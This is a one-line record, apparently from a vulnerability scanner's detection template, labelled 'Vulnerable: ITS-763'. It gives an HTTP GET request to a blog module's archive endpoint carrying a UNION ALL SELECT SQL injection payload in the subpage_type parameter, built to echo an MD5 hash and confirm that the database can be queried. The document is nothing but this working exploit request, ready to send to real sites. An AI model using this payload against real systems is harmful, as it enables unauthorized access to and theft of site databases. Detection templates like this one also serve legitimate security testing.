# Vulnerable: ITS-763
GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}})),NULL,NULL--+-
